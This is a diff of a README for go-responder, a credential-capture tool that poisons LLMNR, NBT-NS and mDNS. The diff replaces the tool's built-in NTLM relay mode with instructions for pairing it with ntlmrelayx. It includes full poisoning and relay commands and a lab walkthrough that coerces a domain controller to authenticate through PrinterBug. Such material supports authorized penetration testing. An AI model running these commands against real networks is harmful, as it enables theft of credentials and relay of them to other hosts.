@@ -47,9 +47,9 @@ Captures NTLMv1/NTLMv2 hashes and cleartext credentials from LLMNR, NBT-NS, mDNS
 - Fixed or random NTLM challenge (`-c`)
 - Analyze mode - log queries, never poison (`-A`)
 - Selective poisoning — skip signing-required hosts (`--selective`)
-- NTLM relay to fixed targets (`--relay`, `--relay-to`)
 - **Persistent credential DB** — JSON file tracks captured accounts across runs; already-known accounts are flagged `✓ KNOWN` instead of re-captured
 - **Rich capture output** — protocol-coloured cards show account, version, hashcat mode and hash at a glance
+- **ntlmrelayx compatible** — run with `-no-smb` to hand port 445 to ntlmrelayx for relay attacks
 
 ## Installation
 
@@ -105,9 +105,6 @@ Disable servers:
   -no-proxy         Disable HTTP proxy
 
 Relay:
-  -relay            Enable NTLM relay mode (forward auth to target instead of capturing)
-  -relay-to <ip>    Comma-separated relay target IPs (auto-select if empty)
-  -relay-cmd <cmd>  Shell command to execute after successful relay (experimental)
   -selective        Selective poisoning: only target hosts where SMB signing is not required
 
 WPAD:
@@ -145,31 +142,35 @@ sudo ./go-responder-linux-amd64 -i eth0 -lnkgen /tmp/triggers
 # SMB only (disable everything else)
 sudo ./go-responder-linux-amd64 -i eth0 -no-http -no-https -no-ftp -no-smtp -no-pop3 -no-imap -no-ldap -no-dcerpc -no-mssql -no-winrm -no-kerberos -no-proxy
 
-# NTLM relay to a fixed target (SMB signing disabled on 10.10.10.50)
-sudo ./go-responder-linux-amd64 -i eth0 --relay --relay-to 10.10.10.50 --selective
+# Pair with ntlmrelayx for relay attacks (go-responder poisons, ntlmrelayx relays)
+sudo ./go-responder-linux-amd64 -i eth0 -no-smb    # Terminal 1 — poison all protocols except SMB
+sudo ntlmrelayx.py -tf targets.txt -smb2support     # Terminal 2 — ntlmrelayx owns port 445
 
 # Resume a session — accounts already in hashes.db will show as KNOWN
 sudo ./go-responder-linux-amd64 -i eth0 -db hashes.db -o hashes.txt
 ```
 
+### Pairing with ntlmrelayx
+
+go-responder handles poisoning and capture. For relay attacks, pair it with `ntlmrelayx.py` from impacket: run go-responder with `-no-smb` so ntlmrelayx can own port 445.
+
+```
+# Terminal 1 — go-responder poisons LLMNR/NBT-NS/mDNS, captures everything else
+sudo ./go-responder-linux-amd64 -i eth0 -no-smb -v
+
+# Terminal 2 — ntlmrelayx relays incoming SMB auth to targets
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+```
+
 ### Testing against GOAD (Game of Active Directory)
 
-GOAD lab: `vboxnet6`, attacker IP `192.168.62.1`, WINTERFELL DC `192.168.62.11`, CASTELBLACK relay target `192.168.62.22`.
-
-**Terminal 1 — start go-responder in relay mode:**
+GOAD lab: `vboxnet6`, attacker IP `192.168.62.1`, WINTERFELL DC `192.168.62.11`.
 
 ```
-sudo ./go-responder-linux-amd64 \
-    -i vboxnet6 \
-    -v \
-    -o /tmp/hashes.txt \
-    -db /tmp/hashes.db \
-    --relay \
-    --relay-to 192.168.62.22 \
-    --selective
+sudo ./go-responder-linux-amd64 -i vboxnet6 -v -o /tmp/hashes.txt -db /tmp/hashes.db
 ```
 
-**Terminal 2 — coerce WINTERFELL to authenticate via PrinterBug:**
+Coerce `WINTERFELL$` to authenticate via PrinterBug:
 
 ```
 nxc smb 192.168.62.11 \
@@ -180,16 +181,7 @@ nxc smb 192.168.62.11 \
     -o LISTENER=192.168.62.1 METHOD=Printerbug
 ```
 
-The `WINTERFELL$` machine account authenticates to us and is relayed to CASTELBLACK.  
 Run the coerce command a second time to see `✓ KNOWN` (dedup in action).
-
-**Optional — trigger a cleartext FTP capture:**
-
-```
-ftp 192.168.62.1
-```
-
-Type any username and password at the prompt — the FTP cleartext card appears in Terminal 1.
 
 ### Capture output
 
